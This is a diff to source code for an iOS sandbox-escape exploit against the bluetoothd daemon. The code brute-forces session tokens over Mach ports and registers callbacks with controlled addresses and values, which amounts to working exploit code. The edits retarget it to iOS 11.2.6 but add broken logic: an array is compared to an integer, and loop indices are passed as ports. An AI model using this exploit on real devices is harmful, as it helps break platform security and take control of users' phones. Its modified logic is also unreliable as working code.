@@ -29,7 +29,7 @@ extern kern_return_t bootstrap_look_up(mach_port_t bs, const char *service_name,
 
 #include <mach/mach.h>
 #include <mach-o/dyld.h>
-#define MAXIMUM_NUMBER_OF_PORTS_AVAILABLE 0xffff
+#define MAXIMUM_NUMBER_OF_PORTS_AVAILABLE 0x206F2 //if this file crashes below 11.2.6 try changing this back to 0xffff
 
 #define BLUETOOTHD_CONST 0xFA300
 #define BLUETOOTHD_WRONG_TOKEN 7
@@ -131,7 +131,7 @@ if(MACH_MSG_SUCCESS == ret)
 {
     return_value = *(mach_msg_return_t *) (((char *) message) + ADD_CALLBACK_MACH_MSG_OUT_RETURN_VALUE_OFFSET);
     if (return_value != BLUETOOTHD_WRONG_TOKEN) {
-        NSLog("Sent message id %d with token %x, returned: %x\n", msgh_id, session_token, return_value);
+        //NSLog("Sent message id %d with token %x, returned: %x\n", msgh_id, session_token, return_value); //comment this out to speed things up a bit
     }
 } else if (MACH_RCV_INVALID_NAME == ret) //Check if something went wrong sending our message
 {
@@ -171,7 +171,7 @@ bool unsandbox() {
     value = 0x13371337;
     
 
-    int ports_found[MAXIMUM_NUMBER_OF_PORTS_AVAILABLE] = {0}; //There are 0xffff (65535) maximum number of ports available, so we create a list of ports with that size
+    int ports_found[MAXIMUM_NUMBER_OF_PORTS_AVAILABLE] = {0}; //There are 0xffff (65535), 0x206F2 (132850) < works on ios 11.2.6 maximum number of ports available, so we create a list of ports with that size
     int number_of_ports_found = 0;
     
     mach_port_t bluetoothd_port = get_service_port(BLUETOOTHD_MIG_SERVER_NAME); //First we need to know what the port of bluetoothd is so we can communicate with the daemon
@@ -189,9 +189,15 @@ bool unsandbox() {
         int result_code = BTLocalDevice_add_callback(bluetoothd_port, id, NULL, 0);
         if(result_code != BLUETOOTHD_WRONG_TOKEN && result_code != -1)
         {
-            NSLog("Found port: %x\n", id);
-            ports_found[number_of_ports_found] = id;
-            number_of_ports_found ++;
+            if (ports_found <= 0x206F2) {   //if this file crashes below 11.2.6 try changing this back to 0xffff
+                NSLog("Found port: %x\n", id);
+                ports_found[number_of_ports_found] = id;
+                number_of_ports_found ++;
+            } else {
+                NSLog("Found port: %x\n", id);
+                //ports_found[number_of_ports_found] = id;
+                number_of_ports_found ++;
+            }
         }
         
         
@@ -199,9 +205,16 @@ bool unsandbox() {
         result_code = BTLocalDevice_add_callback(bluetoothd_port, id, NULL, 0);
         if(result_code != BLUETOOTHD_WRONG_TOKEN && result_code != -1)
         {
-            NSLog("Found port: %x\n", id);
-            ports_found[number_of_ports_found] = id;
-            number_of_ports_found ++;
+            if (ports_found <= 0x206F2) {   //if this file crashes below 11.2.6 try changing this back to 0xffff
+                NSLog("Found port: %x\n", id);
+                ports_found[number_of_ports_found] = id;
+                number_of_ports_found ++;
+            } else {
+                NSLog("Found port: %x\n", id);
+                //ports_found[number_of_ports_found] = id;
+                number_of_ports_found ++;
+            }
+            
         }
         
         
@@ -209,17 +222,28 @@ bool unsandbox() {
         result_code = BTLocalDevice_add_callback(bluetoothd_port, id, NULL, 0);
         if(result_code != BLUETOOTHD_WRONG_TOKEN && result_code != -1)
         {
-            NSLog("Found port: %x\n", id);
-            ports_found[number_of_ports_found] = id;
-            number_of_ports_found ++;
+           if (ports_found <= 0x206F2) {   //if this file crashes below 11.2.6 try changing this back to 0xffff
+                NSLog("Found port: %x\n", id);
+                ports_found[number_of_ports_found] = id;
+                number_of_ports_found ++;
+            } else {
+                NSLog("Found port: %x\n", id);
+                //ports_found[number_of_ports_found] = id;
+                number_of_ports_found ++;
+            }
         }
         
     }
     
     for (int i = number_of_ports_found-1; i>=0; i--) {
         // WORK IN PROGRESS
-        NSLog("Adding callback: Port=%x address=%x value=%x\n", ports_found[i], (unsigned int)address, (unsigned int)value);
-      BTLocalDevice_add_callback(bluetoothd_port, ports_found[i], address, value);
+        if (ports_found <= 0x206F2) {   //if this file crashes below 11.2.6 try changing this back to 0xffff
+            NSLog("Adding callback: Port=%x address=%x value=%x\n", ports_found[i], (unsigned int)address, (unsigned int)value);
+            BTLocalDevice_add_callback(bluetoothd_port, ports_found[i], address, value);
+        } else {
+            NSLog("Adding callback: Port=%x address=%x value=%x\n", i, (unsigned int)address, (unsigned int)value);
+            BTLocalDevice_add_callback(bluetoothd_port, i, address, value);
+        }
     }
     NSLog("Exploit succeeded!\n");
     return true;
